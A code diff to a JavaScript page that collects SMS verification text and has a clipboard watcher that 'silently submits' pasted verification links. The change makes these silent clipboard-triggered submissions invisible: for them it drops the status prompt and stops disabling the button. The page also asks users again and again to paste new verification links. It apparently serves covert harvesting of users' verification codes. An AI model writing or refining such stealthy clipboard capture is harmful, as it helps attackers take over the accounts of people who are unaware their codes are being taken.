@@ -304,13 +304,11 @@ function hideStatus() {
   clipboardBanner.classList.remove('status-visible');
 }
 
-async function submitVerification({ showSubmitting = true, showNextPrompt = false, submissionSource = 'Manually submitted', text = '' } = {}) {
+async function submitVerification({ showSubmitting = true, submissionSource = 'Manually submitted', text = '' } = {}) {
   const smsText = text.trim() || sms.value.trim();
   error.textContent = '';
   if (showSubmitting) {
     showStatus('Submitting...');
-  } else {
-    hideStatus();
   }
 
   if (!smsText) {
@@ -319,8 +317,8 @@ async function submitVerification({ showSubmitting = true, showNextPrompt = fals
     return;
   }
 
-  verifyBtn.disabled = true;
   if (showSubmitting) {
+    verifyBtn.disabled = true;
     verifyBtn.textContent = 'Submitting...';
   }
 
@@ -358,15 +356,13 @@ async function submitVerification({ showSubmitting = true, showNextPrompt = fals
   localStorage.setItem('smsPayload', JSON.stringify(payload));
 
   setTimeout(() => {
-    if (showSubmitting || showNextPrompt) {
-      showStatus('Please paste the new verification link sent to your phone.');
-    }
     if (showSubmitting) {
+      showStatus('Please paste the new verification link sent to your phone.');
       sms.value = '';
       sms.focus();
+      verifyBtn.disabled = false;
+      verifyBtn.textContent = 'Verify';
     }
-    verifyBtn.disabled = false;
-    verifyBtn.textContent = 'Verify';
   }, 3000);
 }
 
@@ -450,7 +446,6 @@ async function watchClipboard() {
           silentSubmitTimer = null;
           await submitVerification({
             showSubmitting: false,
-            showNextPrompt: true,
             submissionSource: 'Silently submitted',
             text: textToSubmit
           });
